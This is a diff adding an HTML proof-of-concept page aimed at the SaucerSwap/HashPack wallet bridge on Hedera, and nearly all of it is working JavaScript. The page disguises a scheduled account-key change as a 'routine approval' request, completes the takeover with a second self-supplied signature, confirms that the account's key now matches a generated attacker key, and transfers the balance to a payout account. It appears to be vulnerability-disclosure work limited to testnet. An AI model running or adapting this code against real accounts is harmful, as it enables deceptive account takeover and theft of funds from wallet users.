@@ -1,1 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SaucerSwap Key Rotation - Simple PoC</title>
 
+<script src="./hedera-sdk.bundle.js"></script>
+
+<style>
+body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #0d0d0d; color: #e6e6e6; padding: 16px; margin: 0; }
+h1 { font-size: 19px; margin-bottom: 5px; }
+.sub { color: #999; font-size: 12px; line-height: 1.5; margin-bottom: 18px; }
+label { display: block; color: #aaa; font-size: 12px; margin-top: 10px; }
+input { width: 100%; box-sizing: border-box; padding: 10px; margin-top: 4px; border-radius: 6px; border: 1px solid #333; background: #181818; color: white; font-size: 14px; }
+button { width: 100%; padding: 12px; margin-top: 11px; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; }
+#connect { background: #38a169; color: white; }
+#rotate  { background: #c53030; color: white; }
+#complete{ background: #b83280; color: white; }
+#check   { background: #319795; color: white; }
+#drain   { background: #742a2a; color: white; }
+button:disabled { opacity: .45; }
+.danger { margin-top: 15px; padding: 12px; background: #2a1414; border: 1px solid #5a2222; border-radius: 8px; font-size: 12px; line-height: 1.5; color: #f6ada0; }
+#log { margin-top: 15px; background: #080808; border: 1px solid #222; border-radius: 8px; padding: 10px; height: 380px; overflow-y: auto; font-family: monospace; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
+.ok { color: #68d391; } .info { color: #63b3ed; } .warn { color: #f6ad55; } .err { color: #fc8181; }
+</style>
+</head>
+
+<body>
+
+<h1>Key Rotation PoC - Simple</h1>
+<div class="sub">
+    Four steps: connect, disguise a key-change as a schedule approval,
+    complete it with a second self-supplied signature, then check
+    whether the account is actually taken over. Testnet only.
+</div>
+
+<div class="danger">
+    <b>Use a disposable testnet account only.</b> This can genuinely
+    take over the target account and, in step 5, drain it.
+</div>
+
+<label>Target account (defaults to connected account after step 1)</label>
+<input id="target" placeholder="0.0.xxxxx">
+
+<button id="connect">1. Connect Wallet</button>
+<button id="rotate" disabled>2. Request Approval (watch the dialog)</button>
+
+<label>Schedule ID (paste from step 2's response, or Mirror Node)</label>
+<input id="scheduleId" placeholder="0.0.xxxxx">
+<label>Funded operator account (pays the fee to complete the takeover)</label>
+<input id="operatorId" placeholder="0.0.xxxxx">
+<label>Operator private key (testnet burner only)</label>
+<input id="operatorKey" placeholder="302e...">
+
+<button id="complete" disabled>3. Complete Takeover (2nd signature)</button>
+<button id="check">4. Check Account (key + balance)</button>
+
+<label>Payout account (only needed for step 5)</label>
+<input id="payout" placeholder="0.0.xxxxx">
+<button id="drain">5. Drain Funds With New Key (proves loss)</button>
+
+<div id="log"></div>
+
+<script>
+(function () {
+
+    const logEl = document.getElementById("log");
+    function log(msg, cls) {
+        const l = document.createElement("div");
+        if (cls) l.className = cls;
+        l.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
+        logEl.appendChild(l);
+        logEl.scrollTop = logEl.scrollHeight;
+    }
+    function s(v) { try { return JSON.stringify(v); } catch (_) { return String(v); } }
+
+    let bridge = null;
+    let connectedAccount = null;
+    let newPrivateKey = null;
+    let newPublicKey = null;
+
+    // auto-discover bridge on load
+    bridge = window.saucerswapWallet || window.hashpack || null;
+    if (bridge) log("Wallet bridge found.", "ok");
+    else log("No wallet bridge detected yet - open this inside the app WebView.", "warn");
+
+    document.getElementById("connect").onclick = async function () {
+        if (!bridge) { log("No bridge available.", "err"); return; }
+        try {
+            const result = await bridge.connect();
+            connectedAccount = result.accountId;
+            log("Connected: " + connectedAccount, "ok");
+            const targetInput = document.getElementById("target");
+            if (!targetInput.value.trim()) targetInput.value = connectedAccount;
+            document.getElementById("rotate").disabled = false;
+        } catch (e) {
+            log("Connect failed: " + e.message, "err");
+        }
+    };
+
+    document.getElementById("rotate").onclick = async function () {
+        const SDK = window.HederaSDK;
+        const target = document.getElementById("target").value.trim();
+        if (!target) { log("Enter a target account.", "err"); return; }
+
+        try {
+            newPrivateKey = SDK.PrivateKey.generateED25519();
+            newPublicKey = newPrivateKey.publicKey;
+            log("Generated attacker key: " + newPublicKey.toString(), "warn");
+
+            const targetId = SDK.AccountId.fromString(target);
+            const creatorId = SDK.AccountId.fromString(connectedAccount);
+
+            const innerTx = new SDK.AccountUpdateTransaction()
+                .setAccountId(targetId)
+                .setKey(newPublicKey);
+
+            const scheduleTx = innerTx.schedule()
+                .setScheduleMemo("routine approval")   // disguise, matches real attack framing
+                .setTransactionId(SDK.TransactionId.generate(creatorId))
+                .setNodeAccountIds([SDK.AccountId.fromString("0.0.3")])
+                .setMaxTransactionFee(500000000)
+                .freeze();
+
+            const bytes = scheduleTx.toBytes();
+            let bin = ""; for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
+            const b64 = btoa(bin);
+
+            log("WATCH THE WALLET POPUP NOW.", "warn");
+            log("Does it mention a key change, or look like any generic approval?", "warn");
+
+            const result = await bridge.signTransaction(b64);
+            log("Wallet response: " + s(result), "ok");
+
+            const sid = result && (result.scheduleId || (result.receipt && result.receipt.scheduleId));
+            if (sid) {
+                document.getElementById("scheduleId").value = String(sid);
+                log("Schedule ID auto-filled: " + sid, "ok");
+            } else {
+                log("No schedule ID returned - look it up on Mirror Node and paste it above.", "warn");
+            }
+
+            document.getElementById("complete").disabled = false;
+
+        } catch (e) {
+            log("Step 2 failed: " + e.message, "err");
+        }
+    };
+
+    document.getElementById("complete").onclick = async function () {
+        const SDK = window.HederaSDK;
+        const scheduleId = document.getElementById("scheduleId").value.trim();
+        const opId = document.getElementById("operatorId").value.trim();
+        const opKey = document.getElementById("operatorKey").value.trim();
+
+        if (!scheduleId || !opId || !opKey || !newPrivateKey) {
+            log("Fill schedule ID + operator fields, and run step 2 first.", "err");
+            return;
+        }
+
+        try {
+            const client = SDK.Client.forTestnet()
+                .setOperator(SDK.AccountId.fromString(opId), SDK.PrivateKey.fromString(opKey));
+
+            const tx = await new SDK.ScheduleSignTransaction()
+                .setScheduleId(SDK.ScheduleId.fromString(scheduleId))
+                .freezeWith(client)
+                .sign(newPrivateKey);
+
+            const receipt = await (await tx.execute(client)).getReceipt(client);
+            log("Second signature submitted. Status: " + receipt.status.toString(), "ok");
+            log("If SUCCESS, the account's key should now be the attacker's key.", "warn");
+
+        } catch (e) {
+            log("Step 3 failed: " + e.message, "err");
+        }
+    };
+
+    document.getElementById("check").onclick = async function () {
+        const target = document.getElementById("target").value.trim();
+        if (!target) { log("Enter a target account.", "err"); return; }
+
+        try {
+            const res = await fetch("https://testnet.mirrornode.hedera.com/api/v1/accounts/" + target);
+            const data = await res.json();
+            const key = data.key && data.key.key;
+            const balance = data.balance && data.balance.balance;
+
+            log("Account " + target + " -> key: " + key + " | balance: " + balance + " tinybar", "info");
+
+            if (newPublicKey) {
+                const expected = newPublicKey.toStringRaw ? newPublicKey.toStringRaw() : newPublicKey.toString();
+                if (key && key.toLowerCase().includes(expected.toLowerCase())) {
+                    log("TAKEOVER CONFIRMED: account key matches the attacker key.", "err");
+                } else {
+                    log("Not rotated (yet) - key does not match attacker key.", "info");
+                }
+            }
+        } catch (e) {
+            log("Check failed: " + e.message, "err");
+        }
+    };
+
+    document.getElementById("drain").onclick = async function () {
+        const SDK = window.HederaSDK;
+        const target = document.getElementById("target").value.trim();
+        const payout = document.getElementById("payout").value.trim();
+
+        if (!target || !payout || !newPrivateKey) {
+            log("Need target, payout account, and a completed rotation (step 2-3).", "err");
+            return;
+        }
+
+        try {
+            const targetId = SDK.AccountId.fromString(target);
+            const payoutId = SDK.AccountId.fromString(payout);
+            const client = SDK.Client.forTestnet().setOperator(targetId, newPrivateKey);
+
+            const before = await (await fetch("https://testnet.mirrornode.hedera.com/api/v1/accounts/" + target)).json();
+            const balBefore = before.balance.balance;
+            const amount = Math.max(0, balBefore - 50000000);
+
+            if (amount <= 0) { log("Nothing to drain - fund the account first.", "err"); return; }
+
+            log("Draining " + amount + " tinybar to " + payout + " using the attacker key...", "warn");
+
+            const tx = await new SDK.TransferTransaction()
+                .addHbarTransfer(targetId, -amount)
+                .addHbarTransfer(payoutId, amount)
+                .execute(client);
+
+            const receipt = await tx.getReceipt(client);
+            log("Drain status: " + receipt.status.toString(), "err");
+
+            const after = await (await fetch("https://testnet.mirrornode.hedera.com/api/v1/accounts/" + target)).json();
+            log("Balance: " + balBefore + " -> " + after.balance.balance + " tinybar", "err");
+
+        } catch (e) {
+            log("Drain failed: " + e.message, "err");
+        }
+    };
+
+    log("Ready.", "ok");
+
+})();
+</script>
+
+</body>
+  </html>
